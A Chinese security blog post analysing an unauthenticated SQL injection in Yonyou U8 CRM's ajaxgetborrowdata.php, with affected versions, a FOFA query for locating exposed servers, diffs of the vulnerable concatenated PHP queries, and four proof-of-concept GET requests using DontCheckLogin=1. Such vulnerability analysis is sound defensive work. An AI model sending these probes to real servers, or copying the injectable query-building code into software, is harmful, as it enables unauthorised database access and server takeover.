---
title: "用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞"
source: https://mrxn.net/jswz/yonyon-u8crm-borrowout-ajaxgetborrowdata-sqli.html
asset_dir: assets/用友u8-crm-ajaxgetborrowdata.php-sql注入漏洞
---

# 用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/8 08:31
- 1069浏览
- [0评论](#comment)
- 56分钟阅读

深入探索

软件

服务器

sql

---

# 漏洞简介

用友U8 CRM[客户关系管理](#)系统是一款专业的企业级CRM[软件](#)，旨在帮助企业高效管理[客户关系](#)、提升销售业绩和提供优质的客户服务。用友 U8 CRM客户关系管理系统 ajaxgetborrowdata.php 文件存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp\_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

客户关系管理

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V13

# fofa语法

> `title="用友U8CRM"`

# 漏洞分析

根据官方[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)通告

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-001-4f6b7b32de12.webp)](https://image.mrxn.net/66502f10c66349b5922fb675fb5d1a52.webp)

可知漏洞原因为sql注入导致的命令注入攻击。

SQL注入检测工具

那直接看 `U8SOFT/turbocrm70/code/www/borrowout/ajaxgetborrowdata.php` 修复前后的差异

当 `Action=getCusInfo` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-002-f2fb7f47ed4d.webp)](https://image.mrxn.net/746347434d524436b9336587f3656b7a.webp)

可以看到修复版本删除了拼接 `cus` 进sql语句部分，以及当 `Action=getWarehouseOtherInfo` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-003-338a62f16085.webp)](https://image.mrxn.net/922c3ef83ade426cab557368a0ea6ea6.webp)

```
case "getWarehouseOtherInfo": 
        $bWhPos='0';  ;
        try
        {     
            $cWhCode = isset ($_GET['cWhCode'])?$_GET['cWhCode']:$_POST['cWhCode'] ;
            //$sql="select case when bWhPos = 1 then '1' else '0' end bWhPos  from Warehouse  where cWhCode ='".$cWhCode."'";
            //$rs = $gblDB->query($sql);
            $stmt = new TSQLStmt();
            $stmt->Table('Warehouse','a');
            $stmt->Select('a','bWhPos');
            $stmt->Cond("a","cWhCode",$cWhCode);
            $sql = $stmt->SQLGen();
            $rs = $gblDB->Query($sql);
```

深入探索

技术文章订阅

网络安全会议

VPN服务

是对 `cWhCode` 进行参数化查询处理，而不是直接拼接进SQL语句中，以及当 `Action=ChangeIexchrate` 时

[![用友U8 CRM ajaxgetborrowdata.php SQL注入漏洞](images/img-004-bca6893df514.webp)](https://image.mrxn.net/a9cf5ff209ae4b648d7da9902e59e6e0.webp)

```
case "ChangeIexchrate": 
        $uflogin = $gblObj->getUfLogin() ;
        $dbc = $uflogin->UfCurrentDb(); 
        $Crrency = isset ($_GET['Crrency'])?$_GET['Crrency']:$_POST['Crrency'] ;
//      $sql = "select * from foreigncurrency where cexch_name = '".$Crrency."'";
//      $rs = $gblDB->query($sql);
        $stmt = new TSQLStmt();
        $stmt->Table('foreigncurrency','a');
        $stmt->Select('a','iotherused');
        $stmt->Cond("a","cexch_name",$Crrency);
        $sql = $stmt->SQLGen();
        $rs = $gblDB->Query($sql);
```

可以看到没有修复之前是直接将 `Crrency` 拼接进sql语句中，无任何过滤和校验，造成[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

以及当 `Action=getCusPrice` 时

```
case "getCusPrice": 
        $UpAutoID = isset ($_GET['i'])?$_GET['i']:$_POST['i'] ;
        $inum = isset ($_GET['n'])?$_GET['n']:$_POST['n'] ;
        $iquantity = isset ($_GET['q'])?$_GET['q']:$_POST['q'] ;
        $itaxrate = isset ($_GET['t'])?$_GET['t']:$_POST['t'] ;
        $iinvexchrate = isset ($_GET['c'])?$_GET['c']:$_POST['c'] ;
        $bObjectCode = isset ($_GET['cus'])?$_GET['cus']:$_POST['cus'] ; 
        $itax1 = isset ($_GET['x'])?$_GET['x']:$_POST['x'] ;
        $iexchrate = isset ($_GET['r'])?$_GET['r']:$_POST['r'] ;
        $Currency = isset ($_GET['m'])?$_GET['m']:$_POST['m'] ; 

        if (empty($UpAutoID)) $UpAutoID = 0;
        if (empty($inum)) $inum = 1;
        if (empty($iquantity)) $iquantity = 1;
        if (empty($itaxrate)) $itaxrate = 17;
        if (empty($iinvexchrate)) $iinvexchrate = 1;
        if (empty($itax1)) $itax1 = 17;
        if (empty($iexchrate)) $iexchrate = 1;
//      if (!empty($Currency)) $Currency = crmChar($Currency);
        if (!empty($bObjectCode)) $bObjectCode = substr($bObjectCode,1);
        $cBusType = crmChar("普通销售");
        $arr=array();   
        if (trim($UpAutoID)!="")
        {
            $tmpTablNamehead = "tmpCrmBorrowChangeHead".mt_rand(100000,999999) ;
            $tmpTablNamebady = "tmpCrmBorrowChangeBady".mt_rand(100000,999999) ;

            $strHeadsql="select N'".$cBusType."' AS cBusType,N'' AS cSTCode,N'' AS cSTName, ";
            $strHeadsql=$strHeadsql."  ".$iexchrate." AS itax1, N'' AS crdcode, N'' AS rrdcode, N'' as ccoutname, " ;
            $strHeadsql=$strHeadsql."  ID,cCODE,cType,(select top 1 cCusCode from Customer  where cCusCode='".$bObjectCode."' or cCusAbbName='".$bObjectCode."' or cCusName='".$bObjectCode."'  ) as bObjectCode,cpersoncode,cdepcode,cmemo,cMaker,cHandler,CloseUser,N'".$Currency."' as cexch_name, ";
            $strHeadsql=$strHeadsql."  ".$iexchrate." as iexchrate,IntoUser,iverifystate,ddate,dVeriDate,dCloseDate,dmDate,dIntoDate,iStatus, ";  
            $strHeadsql=$strHeadsql."  (select top 1 cCusName from Customer  where cCusCode='".$bObjectCode."' or cCusAbbName='".$bObjectCode."' or cCusName='".$bObjectCode."'  ) as bObjectName,iswfcontrolled,ireturncount,cdefine1,cdefine2,cdefine3,cdefine5,cdefine7, ";
            $strHeadsql=$strHeadsql."  cdefine8,cdefine9,cdefine10,cdefine11,cdefine12,cdefine13,cdefine14,cdefine15,cdefine16, ";
            $strHeadsql=$strHeadsql."  cdefine4,cdefine6,ufts,cCreateType,cContactperson,cContactWay,cfreight,cfreightType,cfreightCompany, ";
            $strHeadsql=$strHeadsql."  cfreightCost,cAboutVoucher,cCodeAboutVoucher,MycdefineT1,MycdefineT2,MycdefineT3,MycdefineT4, ";
            $strHeadsql=$strHeadsql."  MycdefineT5,MycdefineT6,MycdefineT7,MycdefineT8,MycdefineT9,MycdefineT10,DownstreamCode, ";
            $strHeadsql=$strHeadsql."  UpStreamCode,cdepname,cpersonname,bObjectName2,bObjectCode2,cVoucherId,VoucherId,VoucherCode, ";
            $strHeadsql=$strHeadsql."  VoucherType,bCusDomestic,cborrowouttype,soType into ".$tmpTablNamehead." ";
            $strHeadsql=$strHeadsql."  from V_HY_DZ_BorrowOutPrice_CRM where ID= (select top 1 ID from HY_DZ_BorrowOutS where AutoID = '".$UpAutoID."')";
```

`$UpAutoID` 也是直接拼接进SQL语句中，造成sql注入漏洞。

漏洞扫描服务

# 漏洞复现

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo&cus=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo&cWhCode=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=ChangeIexchrate&Crrency=' HTTP/1.1
Host: u8crm.mrxn.net
```

```
GET /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusPrice&i=' HTTP/1.1
Host: u8crm.mrxn.net
```

# 参考

- `https://security.yonyou.com/#/patchInfo?identifier=dbed49af1ced41e89fcc67d35e5df6c9`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
